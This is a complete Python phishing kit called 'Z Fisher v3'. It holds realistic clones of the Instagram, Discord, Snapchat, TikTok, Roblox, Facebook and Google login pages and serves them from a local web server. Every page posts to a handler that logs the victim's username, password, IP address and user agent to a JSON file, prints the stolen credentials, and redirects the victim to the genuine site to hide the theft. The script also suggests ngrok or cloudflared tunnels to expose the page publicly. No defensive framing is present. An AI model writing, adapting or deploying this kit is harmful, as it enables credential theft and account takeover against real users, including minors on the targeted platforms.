#!/usr/bin/env python3
"""
Z Fisher v3 - Pages ultra réalistes
Instagram • Facebook • Snapchat • TikTok • Discord • Roblox • Google
"""

import os, json, socket, http.server, socketserver
from urllib.parse import parse_qs
from datetime import datetime

HOST, PORT = "0.0.0.0", 8080
LOG_FILE = "z_fisher_logs.json"

TEMPLATES = {

"instagram": {
"name": "Instagram",
"redirect": "https://www.instagram.com/",
"html": r'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>Instagram</title>
<link rel="icon" href="https://static.cdninstagram.com/rsrc.php/yb/r/lICQ1AydE_7.ico">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fafafa;color:#262626;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.wrapper{margin-top:32px;width:100%;max-width:350px}
.box{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:10px 0;margin-bottom:10px;text-align:center}
.logo{margin:36px auto 12px;height:51px}
.logo img{height:51px}
form{margin:24px 40px 12px}
input{width:100%;height:38px;padding:9px 0 7px 8px;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;font-size:12px;margin-bottom:6px;outline:0}
input:focus{border-color:#a8a8a8}
button{width:100%;height:32px;margin-top:8px;background:#0095f6;color:#fff;border:0;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer}
button:active{opacity:.7}
.or{display:flex;align-items:center;margin:18px 40px 22px}
.or div{height:1px;background:#dbdbdb;flex:1}
.or span{color:#8e8e8e;font-size:13px;font-weight:600;margin:0 18px}
.fb{display:flex;align-items:center;justify-content:center;gap:8px;color:#385185;font-size:14px;font-weight:600;text-decoration:none;margin-bottom:20px}
.fb img{width:16px;height:16px}
.forgot{color:#00376b;font-size:12px;text-decoration:none;display:block;margin-bottom:20px}
.signup{background:#fff;border:1px solid #dbdbdb;padding:20px;text-align:center;font-size:14px}
.signup a{color:#0095f6;font-weight:600;text-decoration:none}
.get{margin:20px 0 10px;font-size:14px;text-align:center}
.stores{display:flex;justify-content:center;gap:8px;margin-bottom:40px}
.stores img{height:40px}
</style>
</head>
<body>
<div class="wrapper">
  <div class="box">
    <div class="logo"><img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/1db01b2ff7b6.png" alt="Instagram" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/132px-Instagram_logo_2016.svg.png'"></div>
    <form method="POST" action="/login">
      <input name="username" placeholder="Phone number, username, or email" required autocomplete="username">
      <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
      <button type="submit">Log in</button>
    </form>
    <div class="or"><div></div><span>OR</span><div></div></div>
    <a class="fb" href="#"><img src="https://static.xx.fbcdn.net/rsrc.php/v3/yN/r/AAcDlXZ2JrX.png" alt="">Log in with Facebook</a>
    <a class="forgot" href="#">Forgot password?</a>
  </div>
  <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
  <div class="get">Get the app.</div>
  <div class="stores">
    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english_en.png/9baef980bbd1.png" alt="App Store">
    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english_en.png/8b514825e333.png" alt="Google Play">
  </div>
</div>
</body>
</html>'''
},

"discord": {
"name": "Discord",
"redirect": "https://discord.com/channels/@me",
"html": r'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Discord</title>
<link rel="icon" href="https://discord.com/assets/favicon.ico">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:"gg sans","Helvetica Neue",Helvetica,Arial,sans-serif;background:#313338;color:#dbdee1;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#1e1f22;width:480px;max-width:96%;border-radius:5px;padding:32px;box-shadow:0 2px 10px 0 rgba(0,0,0,.2)}
h1{font-size:24px;font-weight:600;line-height:30px;text-align:center;margin-bottom:8px;color:#f2f3f5}
.sub{text-align:center;font-size:16px;line-height:20px;color:#b5bac1;margin-bottom:20px}
label{display:block;margin-bottom:8px;font-size:12px;font-weight:700;line-height:16px;text-transform:uppercase;color:#b5bac1}
input{width:100%;height:40px;padding:10px;border-radius:3px;border:none;background:#111214;color:#f2f3f5;font-size:16px;outline:0;margin-bottom:20px}
input:focus{outline:1px solid #5865f2}
a{color:#00a8fc;font-size:14px;text-decoration:none}
a:hover{text-decoration:underline}
button{width:100%;height:44px;margin-top:4px;background:#5865f2;color:#fff;border:none;border-radius:3px;font-size:16px;font-weight:500;cursor:pointer}
button:hover{background:#4752c4}
.need{margin-top:8px;font-size:14px;line-height:16px;color:#949ba4}
</style>
</head>
<body>
<div class="card">
  <h1>Welcome back!</h1>
  <div class="sub">We're so excited to see you again!</div>
  <form method="POST" action="/login">
    <label>Email or Phone Number *</label>
    <input type="text" name="email" required autocomplete="username">
    <label>Password *</label>
    <input type="password" name="password" required autocomplete="current-password">
    <a href="#">Forgot your password?</a>
    <button type="submit">Log In</button>
  </form>
  <div class="need">Need an account? <a href="#">Register</a></div>
</div>
</body>
</html>'''
},

"snapchat": {
"name": "Snapchat",
"redirect": "https://www.snapchat.com/",
"html": r'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Log In • Snapchat</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fffc00;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#fff;width:360px;max-width:92%;border-radius:16px;padding:40px 28px;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,.12)}
.logo{width:72px;height:72px;margin:0 auto 20px;background:#000;border-radius:18px;display:flex;align-items:center;justify-content:center}
.logo svg{width:44px;height:44px;fill:#fffc00}
h1{font-size:26px;font-weight:700;color:#000;margin-bottom:6px}
p{color:#656b73;font-size:15px;margin-bottom:28px}
input{width:100%;height:48px;padding:0 16px;border:1.5px solid #e8e8e8;border-radius:12px;background:#f7f7f7;font-size:16px;margin-bottom:12px;outline:0}
input:focus{border-color:#000;background:#fff}
button{width:100%;height:48px;background:#000;color:#fff;border:none;border-radius:24px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px}
.links{margin-top:24px;font-size:14px}
.links a{color:#0eadff;text-decoration:none;margin:0 6px}
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 24 24"><path d="M12.065 2.5c-4.5 0-8.1 3.4-8.1 7.7 0 2.3 1.1 4.4 2.8 5.8-.1.6-.4 2.1-1.9 3.5 0 0 2.2-.2 3.9-1.5.7.2 1.5.3 2.3.3 4.5 0 8.1-3.4 8.1-7.7s-3.6-8.1-8.1-8.1zm0 1.5c3.6 0 6.5 2.7 6.5 6.2s-2.9 6.2-6.5 6.2c-.7 0-1.4-.1-2-.3l-.5-.2-.4.3c-.7.5-1.5.9-2.3 1.1.6-.9.9-1.8 1-2.3l.1-.5-.4-.4c-1.4-1.2-2.2-2.9-2.2-4.7 0-3.5 2.9-6.2 6.5-6.2z"/></svg>
  </div>
  <h1>Log in to Snapchat</h1>
  <p>Chat, Snap, and watch Stories</p>
  <form method="POST" action="/login">
    <input name="username" placeholder="Username or Email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Log In</button>
  </form>
  <div class="links"><a href="#">Forgot password</a> · <a href="#">Sign Up</a></div>
</div>
</body>
</html>'''
},

"tiktok": {
"name": "TikTok",
"redirect": "https://www.tiktok.com/",
"html": r'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Log in | TikTok</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:TikTokFont,Arial,Helvetica,sans-serif;background:#000;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{width:400px;max-width:94%;background:#121212;border-radius:12px;padding:40px 36px}
.logo{text-align:center;font-size:40px;font-weight:800;margin-bottom:12px;letter-spacing:-1.5px}
.logo span{color:#fe2c55}
h2{text-align:center;font-size:17px;font-weight:600;margin-bottom:28px}
input{width:100%;height:48px;padding:0 14px;border:1px solid #2f2f2f;border-radius:4px;background:#1e1e1e;color:#fff;font-size:15px;margin-bottom:12px;outline:0}
input:focus{border-color:#fe2c55}
button{width:100%;height:48px;background:#fe2c55;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;margin-top:6px}
.or{display:flex;align-items:center;margin:22px 0;color:#8a8b91;font-size:13px}
.or::before,.or::after{content:"";flex:1;height:1px;background:#2f2f2f}
.or span{padding:0 16px}
.sbtn{width:100%;height:44px;background:#1e1e1e;border:1px solid #2f2f2f;color:#fff;border-radius:4px;font-size:15px;margin-bottom:10px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px}
.footer{text-align:center;margin-top:28px;font-size:14px;color:#8a8b91}
.footer a{color:#fe2c55;text-decoration:none}
</style>
</head>
<body>
<div class="card">
  <div class="logo">Tik<span>Tok</span></div>
  <h2>Log in to TikTok</h2>
  <form method="POST" action="/login">
    <input name="username" placeholder="Email or username" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Log in</button>
  </form>
  <div class="or"><span>OR</span></div>
  <button class="sbtn" type="button">Continue with Google</button>
  <button class="sbtn" type="button">Continue with Facebook</button>
  <div class="footer">Don't have an account? <a href="#">Sign up</a></div>
</div>
</body>
</html>'''
},

"roblox": {
"name": "Roblox",
"redirect": "https://www.roblox.com/home",
"html": r'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Roblox</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Builder Sans,Helvetica Neue,Helvetica,Arial,sans-serif;background:#232527;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff}
.card{background:#393b3d;width:400px;max-width:94%;border-radius:12px;padding:40px 32px;text-align:center}
.logo{font-size:34px;font-weight:800;letter-spacing:-1px;margin-bottom:28px}
input{width:100%;height:48px;padding:0 16px;border:1px solid #5a5b5d;border-radius:8px;background:#232527;color:#fff;font-size:16px;margin-bottom:14px;outline:0}
input:focus{border-color:#00a2ff}
button{width:100%;height:48px;background:#00a2ff;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:4px}
button:hover{background:#0089d9}
.forgot{display:block;margin:18px 0 8px;color:#00a2ff;font-size:14px;text-decoration:none}
.signup{margin-top:18px;font-size:14px;color:#bdbebe}
.signup a{color:#00a2ff;text-decoration:none;font-weight:600}
</style>
</head>
<body>
<div class="card">
  <div class="logo">ROBLOX</div>
  <form method="POST" action="/login">
    <input name="username" placeholder="Username/Email/Phone" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Log In</button>
  </form>
  <a class="forgot" href="#">Forgot Password or Username?</a>
  <div class="signup">Don't have an account? <a href="#">Sign Up</a></div>
</div>
</body>
</html>'''
},

"facebook": {
"name": "Facebook",
"redirect": "https://www.facebook.com/",
"html": r'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Facebook – log in or sign up</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center}
.container{display:flex;max-width:980px;width:100%;padding:20px;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:40px}
.left{flex:1;min-width:300px}
.left h1{color:#0866ff;font-size:56px;letter-spacing:-1.5px;line-height:1}
.left h2{font-size:26px;font-weight:400;line-height:32px;color:#1c1e21;margin-top:12px;max-width:500px}
.right{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:16px;width:396px;max-width:100%}
input{width:100%;height:52px;padding:14px 16px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;outline:0}
input:focus{border-color:#0866ff;box-shadow:0 0 0 2px #e7f3ff}
button{width:100%;height:48px;background:#0866ff;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer}
button:hover{background:#0759d8}
.forgot{display:block;text-align:center;margin:16px 0;color:#0866ff;font-size:14px;text-decoration:none}
.line{border-bottom:1px solid #dadde1;margin:20px 16px}
.create{display:block;width:fit-content;margin:0 auto 8px;padding:14px 16px;background:#42b72a;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:700;text-decoration:none}
</style>
</head>
<body>
<div class="container">
  <div class="left">
    <h1>facebook</h1>
    <h2>Connect with friends and the world around you on Facebook.</h2>
  </div>
  <div class="right">
    <form method="POST" action="/login">
      <input name="email" placeholder="Email or phone number" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
    <a class="forgot" href="#">Forgot password?</a>
    <div class="line"></div>
    <a class="create" href="#">Create new account</a>
  </div>
</div>
</body>
</html>'''
},

"google": {
"name": "Google",
"redirect": "https://accounts.google.com/",
"html": r'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in - Google Accounts</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:"Google Sans",Roboto,Arial,sans-serif;background:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{width:450px;max-width:96%;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px}
.logo{height:24px;margin-bottom:16px}
h1{font-size:24px;font-weight:400;color:#202124;margin-bottom:8px}
.sub{font-size:16px;color:#5f6368;margin-bottom:32px}
input{width:100%;height:54px;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:20px;outline:0}
input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px #e8f0fe}
.row{display:flex;justify-content:space-between;align-items:center;margin-top:32px}
.row a{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none}
button{background:#1a73e8;color:#fff;border:none;height:36px;padding:0 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer}
button:hover{background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,.2)}
</style>
</head>
<body>
<div class="card">
  <div class="logo"><img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_74x24dp.png" alt="Google" height="24"></div>
  <h1>Sign in</h1>
  <div class="sub">Use your Google Account</div>
  <form method="POST" action="/login">
    <input type="email" name="email" placeholder="Email or phone" required>
    <input type="password" name="password" placeholder="Enter your password" required>
    <div class="row">
      <a href="#">Forgot email?</a>
      <button type="submit">Next</button>
    </div>
  </form>
</div>
</body>
</html>'''
}
}

def log_credentials(data):
    entry = {
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "ip": data["ip"],
        "ua": data["ua"],
        "user": data["user"],
        "pass": data["pass"],
        "template": data["template"]
    }
    logs = []
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE) as f: logs = json.load(f)
        except: pass
    logs.append(entry)
    with open(LOG_FILE, "w") as f: json.dump(logs, f, indent=2)
    print(f"\n[+] CAPTURED  {entry['template'].upper()}")
    print(f"    {entry['time']} | {entry['ip']}")
    print(f"    User : {entry['user']}")
    print(f"    Pass : {entry['pass']}")
    print("-"*55)

class Handler(http.server.SimpleHTTPRequestHandler):
    template = "instagram"
    def do_GET(self):
        if self.path in ("/","/index.html","/login"):
            self.send_response(200)
            self.send_header("Content-type","text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(TEMPLATES[self.template]["html"].encode())
        else: self.send_error(404)
    def do_POST(self):
        if self.path == "/login":
            length = int(self.headers.get("Content-Length",0))
            body = self.rfile.read(length).decode(errors="ignore")
            p = parse_qs(body)
            user = (p.get("username") or p.get("email") or [""])[0]
            password = (p.get("password") or [""])[0]
            log_credentials({"ip":self.client_address[0],"ua":self.headers.get("User-Agent",""),"user":user,"pass":password,"template":self.template})
            self.send_response(302)
            self.send_header("Location", TEMPLATES[self.template]["redirect"])
            self.end_headers()
        else: self.send_error(404)
    def log_message(self,*a): pass

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8",80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except: return "127.0.0.1"

def main():
    print("\n  Z FISHER v3  —  Realistic pages\n")
    keys = list(TEMPLATES.keys())
    for i,k in enumerate(keys,1):
        print(f"  {i}. {TEMPLATES[k]['name']}")
    c = input("\nChoix (1-7) : ").strip()
    try: template = keys[int(c)-1]
    except: template = "instagram"
    port = input(f"Port [{PORT}] : ").strip()
    port = int(port) if port.isdigit() else PORT
    Handler.template = template
    print(f"\n[+] {TEMPLATES[template]['name']}")
    print(f"[+] http://127.0.0.1:{port}")
    print(f"[+] http://{get_ip()}:{port}")
    print(f"[+] Logs → {LOG_FILE}")
    print("\n[!] Public link :  ngrok http", port)
    print("                  cloudflared tunnel --url http://localhost:"+str(port))
    print("\n[*] Listening...\n")
    with socketserver.TCPServer((HOST,port),Handler) as httpd:
        try: httpd.serve_forever()
        except KeyboardInterrupt: print("\n[!] Stopped")

if __name__ == "__main__":
    main()
